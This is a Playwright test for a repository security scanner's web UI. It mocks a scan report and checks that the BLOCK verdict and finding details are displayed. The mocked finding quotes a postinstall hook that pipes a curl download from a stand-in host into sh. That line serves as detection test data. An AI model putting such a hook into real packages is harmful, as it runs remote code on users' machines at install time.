import { expect, test } from "@playwright/test";

test("web UI scans a GitHub URL and shows verified findings", async ({ page }) => {
  await page.route("**/api/scan", async (route) => {
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify({
        report: {
          verdict: "BLOCK",
          riskScore: 80,
          findings: [
            {
              id: "finding_test",
              ruleId: "SCRIPT_REMOTE_EXEC_CRITICAL",
              severity: "critical",
              filePath: "package.json",
              startLine: 5,
              evidence: "\"postinstall\": \"curl https://example.invalid/install.sh | sh\"",
              explanation: "Remote content appears to be downloaded and executed.",
              remediation: "Inspect artifacts before running them."
            }
          ],
          staticOnlyNotice: "No repository code was executed during this scan.",
          validationErrors: []
        },
        markdown: "# VibeProof Risk Report"
      })
    });
  });

  await page.goto("/");
  await expect(page.getByRole("heading", { name: /Paste a GitHub repository/ })).toBeVisible();
  await page.getByLabel("GitHub repository URL").fill("https://github.com/acme/demo");
  await page.getByRole("button", { name: "Scan" }).click();

  await expect(page.getByText("BLOCK")).toBeVisible();
  await expect(page.getByText("SCRIPT_REMOTE_EXEC_CRITICAL")).toBeVisible();
  await expect(page.getByText("package.json:5")).toBeVisible();
  await expect(page.getByText("No repository code was executed during this scan.")).toBeVisible();
});

